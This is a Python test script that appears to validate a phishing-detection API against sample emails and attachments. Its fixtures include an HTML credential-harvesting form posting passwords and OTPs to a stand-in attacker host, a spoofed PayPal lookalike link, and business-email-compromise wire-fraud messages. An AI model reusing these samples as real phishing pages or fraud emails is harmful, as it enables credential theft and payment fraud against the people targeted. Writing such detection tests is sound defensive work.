"""
Validation tests for new PhishShield advanced detection capabilities:
1. Attachment content analysis (PDF/HTML/DOCX)
2. Image/QR phishing detection
3. Thread hijacking detection
"""
import json
import requests
import base64
import sys

API = "http://127.0.0.1:8000/scan"
PASS = 0
FAIL = 0

def test(name, payload, expect_signals=None, expect_min_score=None, expect_verdict=None):
    global PASS, FAIL
    try:
        r = requests.post(API, json=payload, timeout=10)
        r.raise_for_status()
        data = r.json()
        score = data.get("risk_score", data.get("riskScore", 0))
        verdict = data.get("verdict", "")
        signals = data.get("signals", [])
        ok = True
        reasons = []

        if expect_signals:
            for s in expect_signals:
                found = any(s.lower() in sig.lower() for sig in signals)
                if not found:
                    ok = False
                    reasons.append(f"Missing signal: '{s}'")

        if expect_min_score and score < expect_min_score:
            ok = False
            reasons.append(f"Score {score} < expected {expect_min_score}")

        if expect_verdict and verdict.lower() != expect_verdict.lower():
            ok = False
            reasons.append(f"Verdict '{verdict}' != expected '{expect_verdict}'")

        status = "PASS" if ok else "FAIL"
        if ok:
            PASS += 1
        else:
            FAIL += 1
        print(f"  [{status}] {name}")
        print(f"         Score={score} Verdict={verdict}")
        if signals:
            print(f"         Signals: {signals[:5]}")
        if reasons:
            for r in reasons:
                print(f"         ** {r}")
        print()
    except Exception as e:
        FAIL += 1
        print(f"  [ERROR] {name}: {e}")
        print()


print("=" * 70)
print("  ADVANCED DETECTION CAPABILITIES VALIDATION")
print("=" * 70)
print()

# ---- 1. ATTACHMENT ANALYSIS ----
print("--- 1. ATTACHMENT CONTENT ANALYSIS ---")
print()

# 1a. HTML attachment with credential harvesting form
html_phish = base64.b64encode(b"""
<html><body>
<h1>Your Account Has Been Suspended</h1>
<p>Please verify your account immediately to restore access.</p>
<form action="http://evil-phish.com/steal" method="post">
    <input type="text" name="username" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <input type="hidden" name="otp" value="">
    <button type="submit">Verify Account</button>
</form>
</body></html>
""").decode()

test("HTML attachment with phishing form", {
    "email_text": "Please review the attached document regarding your account security.",
    "attachments": [{
        "filename": "security_notice.html",
        "contentType": "text/html",
        "content": html_phish,
        "size": 500,
    }]
}, expect_signals=["attachment"])

# 1b. HTML attachment with hidden link mismatch
html_mismatch = base64.b64encode(b"""
<html><body>
<p>Click below to verify your PayPal account:</p>
<a href="http://paypa1-secure.evil.com/login">www.paypal.com/verify</a>
<p>If you did not request this, please ignore.</p>
</body></html>
""").decode()

test("HTML attachment with link mismatch", {
    "email_text": "Important: your PayPal account needs verification. See attached.",
    "attachments": [{
        "filename": "verify.html",
        "contentType": "text/html",
        "content": html_mismatch,
        "size": 300,
    }]
}, expect_signals=["attachment", "brand"])

# 1c. Attachment with phishing text (extractedText field)
test("Attachment with credential harvesting text", {
    "email_text": "Please review the attached invoice for your records.",
    "attachments": [{
        "filename": "invoice.pdf",
        "contentType": "application/pdf",
        "size": 50000,
        "extractedText": "Your account has been suspended. Click here to verify your account. Enter your password and OTP to confirm your identity. Unauthorized access detected on your account."
    }]
}, expect_signals=["credential harvesting", "attachment"])

# 1d. Safe attachment (no phishing) - should NOT trigger
test("Safe attachment (meeting notes)", {
    "email_text": "Hi team, please find attached the meeting notes from today's standup.",
    "attachments": [{
        "filename": "meeting_notes.docx",
        "contentType": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "size": 25000,
        "extractedText": "Meeting Notes - Sprint 42 Review. Attendees: John, Sarah, Mike. Action items: 1. Update deployment docs 2. Review PR #234."
    }]
}, expect_verdict=None)  # Should stay low risk

# ---- 2. IMAGE/QR PHISHING ----
print("--- 2. IMAGE / QR PHISHING ---")
print()

# 2a. Image attachment with QR code flag
test("Image with QR code flag", {
    "email_text": "Scan the QR code in the attachment to verify your bank account and claim your reward.",
    "attachments": [{
        "filename": "qr_verification.png",
        "contentType": "image/png",
        "size": 50000,
        "hasQrCode": True,
    }]
}, expect_signals=["QR"])

# 2b. Email referencing QR scanning
test("Email urging QR scan", {
    "email_text": "Dear customer, your account requires immediate verification. Please scan the attached QR code to update your payment details and avoid account suspension.",
    "attachments": [{
        "filename": "verify_qr.png",
        "contentType": "image/png",
        "size": 40000,
        "hasQrCode": True,
    }]
}, expect_signals=["QR"])

# ---- 3. THREAD HIJACKING ----
print("--- 3. THREAD HIJACKING DETECTION ---")
print()

# 3a. Classic thread hijack - payment switch
test("Thread hijack: payment account switch", {
    "email_text": """Re: Invoice Payment #4521

Hi Sarah,

Following up on our conversation - please note that our bank account details have been updated.
Please urgently wire the payment to the new account details below:
Account: 12345678
Sort Code: 40-10-20

Please keep this confidential and process it today.

Best regards,
John

-----Original Message-----
From: Sarah Johnson <sarah@company.com>
Sent: Monday, April 14, 2026 10:30 AM
To: John Smith <john@partner.com>
Subject: Re: Invoice Payment #4521

Hi John,

Thanks for sending the invoice. I'll process the payment of $45,000 this week.
Could you confirm the bank details?

Best regards,
Sarah
"""
}, expect_signals=["thread hijack", "tone anom"])

# 3b. BEC with authority + confidentiality 
test("Thread hijack: BEC authority impersonation", {
    "email_text": """Re: Urgent - Wire Transfer Required

I'm currently in a meeting and cannot talk. Can you handle this urgently?

Please wire $89,000 to the following updated beneficiary account immediately.
Do not share this with anyone else. This is strictly confidential.

- CEO

-----Original Message-----
From: Jane Doe <jane@company.com>
Sent: Monday, April 14, 2026 2:15 PM
Subject: Project Budget Update

Hi all,

Here are the Q2 project budget figures for your review.
Looking forward to discussing in tomorrow's meeting.

Best,
Jane
"""
}, expect_signals=["thread hijack"])

# 3c. Normal reply-thread (should NOT trigger)
test("Normal reply thread (no hijack)", {
    "email_text": """Re: Team lunch tomorrow

Sounds great! I'll bring the dessert.

Thanks,
Mike

On Mon, Apr 14, 2026 at 3:00 PM, Lisa Brown <lisa@company.com> wrote:
> Hi everyone,
> Let's do a team lunch tomorrow at noon. 
> I'll order pizza from that new place.
> 
> Lisa
"""
})

# ---- 4. COMBINED SCENARIOS ----
print("--- 4. COMBINED ATTACK SCENARIOS ---")
print()

# 4a. Thread hijack + malicious attachment
test("Combined: thread hijack + phishing attachment", {
    "email_text": """Re: Account Review

Please review the attached updated payment form immediately.
Our bank details have changed - process the transfer to the new account today.
This is urgent and confidential.

-----Original Message-----
From: Finance Team <finance@company.com>
Subject: Account Review

Hi, here is the quarterly account review. All looks good.
""",
    "attachments": [{
        "filename": "payment_form.html",
        "contentType": "text/html",
        "size": 2000,
        "extractedText": "Enter your password and confirm your account details. Verify your identity to process the payment."
    }]
}, expect_signals=["context shifts", "attachment"])

# 4b. Password-protected attachment with suspicious context
test("Password-protected attachment + urgency", {
    "email_text": "URGENT: Your account has been compromised. See the attached secure document (password: 1234) for recovery instructions. Enter your credentials immediately.",
    "attachments": [{
        "filename": "secure_recovery.zip",
        "contentType": "application/zip",
        "size": 15000,
        "isPasswordProtected": True,
    }]
}, expect_signals=["password-protected", "attachment"])

print("=" * 70)
print(f"  RESULTS: {PASS} passed, {FAIL} failed out of {PASS + FAIL}")
print("=" * 70)

if FAIL > 0:
    sys.exit(1)
